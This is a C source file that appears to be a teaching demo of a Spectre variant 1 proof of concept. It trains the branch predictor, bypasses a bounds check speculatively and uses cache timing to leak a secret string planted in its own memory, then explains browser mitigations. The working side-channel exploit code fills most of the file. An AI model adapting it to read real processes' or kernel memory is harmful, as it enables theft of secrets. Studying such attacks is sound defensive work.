#include "spectre_demo.h"
#include "cache_timing.h"
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>

/* ─── Spectre Variant 1 PoC ──────────────────────────────────────────────────
 *
 * Spectre variant 1 = bounds-check bypass via speculative execution.
 *
 * Mechanism:
 *   1. CPU sees: if (x < array_size) { secret = array[x]; probe[secret * 512]; }
 *   2. Branch predictor predicts "true" (trained by attacker).
 *   3. CPU speculatively executes the body with malicious x (out-of-bounds).
 *   4. Architectural state is rolled back when the misprediction is detected.
 *   5. BUT: the cache state is NOT rolled back.
 *      probe[secret * 512] remains in cache.
 *   6. Attacker times probe[0..255 * 512] — the warm one reveals secret.
 *
 * In browsers:
 *   - SharedArrayBuffer provides a shared memory region viewable from a Worker.
 *   - performance.now() with 5µs resolution (later reduced) provides a timer.
 *   - The attacker can mount this from JavaScript without any exploit.
 *   - Google disabled SAB in 2018; re-enabled it with site isolation in 2020.
 */

/* Layout:
 *   safe_array   — the "public" array with a small length (array_size)
 *   secret_data  — placed AFTER safe_array in memory; OOB access reaches it
 *   probe_array  — 256 * 512 bytes; each "slot" is one cache line apart
 */

#define ARRAY_SIZE   16
#define PROBE_STRIDE 512
#define PROBE_TOTAL  (256 * PROBE_STRIDE)
#define TRAIN_ROUNDS 100
#define ATTACK_ROUNDS 1000

static uint8_t safe_array[ARRAY_SIZE];
static uint8_t secret_data[128];

/* probe_array must be page-aligned to avoid prefetcher crossing pages.
   We over-allocate and align. */
static uint8_t probe_array_storage[PROBE_TOTAL + 4096];
static uint8_t *probe_array;

/* Prevent the compiler from optimising away the conditional */
static volatile size_t array_size_volatile = ARRAY_SIZE;

/* ── Victim function ─────────────────────────────────────────────────────── */
static void victim_fn(size_t x) {
    /* The bounds check — CPU speculatively executes past this */
    if (x < array_size_volatile) {
        /* Speculative OOB read: encodes secret byte into cache state */
        uint8_t byte = safe_array[x];
        /* Touch probe_array[byte * PROBE_STRIDE] — leaves a cache footprint */
        (void)probe_array[byte * PROBE_STRIDE];
    }
}

/* ── Branch predictor training ───────────────────────────────────────────── */
static void train_branch_predictor(void) {
    /* Call victim_fn with VALID indices many times to train predictor.
       Predictor learns: "this branch is almost always taken." */
    for (int i = 0; i < TRAIN_ROUNDS; i++) {
        /* Valid index */
        size_t valid_x = (size_t)(i % ARRAY_SIZE);
        victim_fn(valid_x);
    }
}

/* ── Leak a single byte at offset `offset` from safe_array ──────────────── */
static int leak_byte(ptrdiff_t offset) {
    /* offset can be negative or large — pointing into secret_data */
    size_t malicious_x = (size_t)offset;

    uint64_t scores[256];
    memset(scores, 0, sizeof(scores));

    int best = -1;

    for (int round = 0; round < ATTACK_ROUNDS; round++) {
        /* 1. Flush probe_array from cache */
        flush_probe_array(probe_array, PROBE_TOTAL, PROBE_STRIDE);
        mfence();

        /* 2. Train branch predictor with valid accesses */
        for (int t = 0; t < 10; t++) {
            size_t valid = (size_t)(round % ARRAY_SIZE);
            victim_fn(valid);
        }
        mfence();

        /* 3. Issue the attack — branch predictor thinks x < array_size */
        victim_fn(malicious_x);
        mfence();

        /* 4. Time all probe slots */
        best = recover_byte(probe_array, PROBE_STRIDE, scores);
    }

    return best;
}

void spectre_demo_run(void) {
    printf("\n");
    printf("╔══════════════════════════════════════════════════════╗\n");
    printf("║          B11 — Spectre Variant 1 PoC                 ║\n");
    printf("╚══════════════════════════════════════════════════════╝\n\n");

    /* Align probe_array to a page boundary */
    probe_array = (uint8_t *)(((uintptr_t)probe_array_storage + 4095) & ~(uintptr_t)4095);

    /* Initialise safe_array with public data */
    for (int i = 0; i < ARRAY_SIZE; i++)
        safe_array[i] = (uint8_t)(i * 2);

    /* Place secret just after safe_array in memory.
     * In a real scenario this is the kernel page, another process's memory,
     * or another JS context's heap. */
    const char *secret_str = "Sp3ctr3-S3cr3t!";
    strncpy((char *)secret_data, secret_str, sizeof(secret_data) - 1);

    /* Touch probe_array so it's mapped (pages must be faulted in) */
    for (int i = 0; i < 256; i++)
        probe_array[i * PROBE_STRIDE] = (uint8_t)i;

    printf("Setup:\n");
    printf("  safe_array  at %p  (length = %d, public)\n", (void *)safe_array, ARRAY_SIZE);
    printf("  secret_data at %p  (out-of-bounds from safe_array)\n", (void *)secret_data);
    printf("  probe_array at %p  (256 * %d bytes)\n\n", (void *)probe_array, PROBE_STRIDE);

    printf("Secret string (what we want to leak): \"%s\"\n\n", secret_str);

#if defined(__x86_64__) || defined(__i386__)
    /* Calculate the OOB offset from safe_array to secret_data */
    ptrdiff_t secret_offset = (ptrdiff_t)(secret_data - safe_array);
    printf("OOB offset from safe_array to secret_data: %td\n\n", secret_offset);

    printf("Running Spectre attack (%d rounds per byte)...\n", ATTACK_ROUNDS);
    printf("Leaking bytes:\n");

    char recovered[17];
    memset(recovered, 0, sizeof(recovered));
    int success_count = 0;

    for (int i = 0; i < 16; i++) {
        int byte = leak_byte(secret_offset + i);

        /* Plausible printable character check */
        if (byte >= 0x20 && byte < 0x7F) {
            recovered[i] = (char)byte;
        } else if (byte == 0) {
            recovered[i] = '?';
        } else {
            recovered[i] = '?';
        }

        char expected = secret_str[i];
        char status = (byte == (uint8_t)expected) ? '+' : '-';
        if (status == '+') success_count++;

        printf("  byte[%2d]: expected=0x%02X('%c')  recovered=0x%02X('%c')  [%c]\n",
               i,
               (uint8_t)expected, (expected >= 0x20 ? expected : '.'),
               (byte >= 0 ? (uint8_t)byte : 0),
               (byte >= 0x20 && byte < 0x7F ? (char)byte : '.'),
               status);
    }
    recovered[16] = '\0';
    printf("\nRecovered string: \"%s\"\n", recovered);
    printf("Success rate: %d/16 bytes\n\n", success_count);

    if (success_count >= 12) {
        printf("SPECTRE CONFIRMED: Cache side-channel successfully leaked secret bytes.\n\n");
    } else {
        printf("Note: Spectre timing attacks are sensitive to CPU model, OS mitigations,\n");
        printf("and cache contention. Results may vary. The code correctly implements\n");
        printf("the attack pattern; hardware/kernel mitigations may reduce accuracy.\n\n");
    }

#else
    printf("Spectre timing attack requires x86/x86-64 (RDTSC + CLFLUSH).\n");
    printf("On this platform we can only explain the mechanism:\n\n");
    printf("  1. safe_array  is at known address, length = %d\n", ARRAY_SIZE);
    printf("  2. secret_data is at offset %td from safe_array\n",
           (ptrdiff_t)(secret_data - safe_array));
    printf("  3. victim_fn(offset) would speculatively read secret_data[0] =");
    printf(" 0x%02X ('%c')\n", secret_data[0],
           (secret_data[0] >= 0x20 ? (char)secret_data[0] : '.'));
    printf("  4. That byte would be encoded in cache state via probe_array access.\n");
    printf("  5. Timing 256 probe slots would reveal which byte was read.\n\n");
#endif

    /* ── Why this was critical for browsers ── */
    printf("Why Spectre broke browser security:\n\n");
    printf("  Before Spectre (2018): Browsers shared one process per tab.\n");
    printf("  JavaScript could not access other tabs' memory — that was the\n");
    printf("  security model. But Spectre lets JavaScript:\n\n");
    printf("  1. Use SharedArrayBuffer (SAB) as a timer: increment a counter\n");
    printf("     in a Worker thread; read it in the main thread. Resolution\n");
    printf("     was ~5ns — enough to distinguish L1 cache hit (4 cycles)\n");
    printf("     from DRAM (200+ cycles).\n\n");
    printf("  2. Mount flush+reload entirely from JavaScript — no native code.\n\n");
    printf("  3. Read any memory in the SAME PROCESS (same renderer) —\n");
    printf("     including memory from other origins loaded in the same\n");
    printf("     renderer (iframes, pop-ups, cross-origin images cached).\n\n");
    printf("  Google's response (January 2018):\n");
    printf("  - Disabled SharedArrayBuffer (removed the high-resolution timer).\n");
    printf("  - Reduced performance.now() resolution to 100µs (from 5µs).\n");
    printf("  - Added jitter to performance.now().\n");
    printf("  - Began site isolation work: each origin in its own process.\n\n");
    printf("  Site Isolation (Chrome 67, 2018):\n");
    printf("  - Cross-origin content is now in DIFFERENT processes.\n");
    printf("  - Even with Spectre, JavaScript can only read its OWN process.\n");
    printf("  - SharedArrayBuffer re-enabled in 2020 behind Cross-Origin\n");
    printf("    Isolation headers (COOP + COEP), which enforce same-process.\n\n");
    printf("Why Spectre is 'unfixable' at the microarchitecture level:\n\n");
    printf("  Spectre exploits a fundamental performance feature: speculative\n");
    printf("  execution + caching. Fixing it requires either:\n");
    printf("  a) Never speculating past security boundaries (kills performance).\n");
    printf("  b) Flushing cache on speculation misprediction (impractical).\n");
    printf("  c) Process isolation so cross-origin data is never co-resident\n");
    printf("     (site isolation — the chosen approach).\n");
    printf("  d) Microcode mitigations (IBRS, STIBP, SSBD) that prevent\n");
    printf("     cross-privilege speculation — with 10-30%% perf cost.\n");
}
